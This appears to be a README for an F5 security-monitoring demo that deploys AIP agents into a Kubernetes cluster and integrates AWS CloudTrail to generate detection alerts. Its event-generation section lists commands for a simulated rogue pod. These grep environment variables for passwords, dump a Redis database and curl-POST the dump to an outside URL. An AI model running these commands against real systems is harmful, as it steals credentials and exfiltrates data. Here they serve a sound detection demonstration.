XC AIP Demo with CloudTrail integration
==============================
This blueprint allows you to automatically deploy AIP agents into an existing Kubernetes cluster (k3s) running across 2 nodes in UDF. Additionally this blueprint leverages AWS cloud account to configure and integrate AWS CloudTrail with AIP automatically.

What you need to do **BEFORE starting the deployment:**
-------------------------------------------------------

## Copy AIP keys and Account ID


1. Login to F5 Distributed Cloud tenant where you would like AIP to be connected to
2. Navigate to *App Infrastructure Protection* -> **YOUR ORG (mapped NS in XC)** ->*Settings* -> *Keys*
3. Copy the following values:
    - **Deployment Key**
    - **REST API Key**
    - **Organization ID**
    - **User ID**

4. Navigate to *Settings* -> *Integrations* -> *Click on "ADD AWS INTEGRATION"
5. Copy **Account ID** value

## **NEW** Populate Deployment Tags
Recent UDF release introduced deployment-wide tags that this BP uses in place of component-specific User Tags. We recommend using Deployment Tags as it guarantees long-term support from UDF.

1. In this UDF blueprint locate Tags tab
2. You need to populate 5 tags: DEPLOYMENT_KEY, API_KEY, ORG, USER and ACCOUNT. Optionally, populate **ENABLE_RULES** tag if you want the system to auto-enable rules in the following Rulesets: 
      - Base Rule Set
      - Docker Rule Set
      - Kubernetes Rule Set
      - CloudTrail Rule Set

*Note: Due to AIP API throttling (max 16 requests per min) it will take the script full **15 mins** to enable all 238 rules across the Rulesets.*


**Example of Deployment Tags:**

![tags](https://github.com/f5devcentral/aip-demo-udf/blob/main/user_tags.jpg?raw=true)

## Start the deployment

Startup script will perform the following actions to integrate 3 agents (1 on each node plus 1 agent that "listens" to k8s API) and AWS CloudTrail:

 1. Gather data from env file and UDF metadata (user tags)
 2. Deploy stack using Cloudformation template
 3. Create integration on AIP side and gather External ID
 4. Update stack with AIP External ID
 5. Create CloudTrail resources in AIP

## Generating the events

There is a "rogue" pod that will be generating events. The pod uses the following commands to simulate the adversary:

```
kubectl apply -f pod.yaml
kubectl exec redis-client -- env |grep -i pass
REDISCLI_AUTH="$REDIS_PASSWORD" /usr/local/bin/redis-cli -h redis-cluster-master keys \* > my.db
curl --connect-timeout 1 -X POST -F "image=@my.db" https://f5se.com/data/db/my/1.db
```

This behavior is in line with the attacker locating redis DB and exfiltrating DB data to an arbitrary URL

## Enabling Rules

Unless **ENABLE_RULES** User Tag was specified for the deployment, it is necessary to manually enable Rules in order for the system to start generating **Alerts**

To manually enable the Rules, navigate to *Rules* and enable the following Rule Sets:

  1. Base Rule Set
  2. Docker Rule Set
  3. Cloud Trail Rule Set
  4. Kubernetes Rule Set

Additionally, under **RULE TYPE** select the following types and ensure all rules under these types are enabled:

  1. Cloud Trail
  2. File Integrity
  3. Host
  4. Kubernetes Audit
